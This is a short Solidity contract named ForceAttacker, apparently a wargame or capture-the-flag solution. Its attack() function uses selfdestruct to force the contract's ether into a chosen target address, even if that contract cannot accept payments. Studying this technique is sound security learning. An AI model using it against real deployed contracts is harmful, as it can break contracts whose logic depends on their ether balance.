// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
    address _target;

    constructor(address target_) {
        _target = target_;
    }

    function attack() public {
        selfdestruct(payable(_target));
    }
}
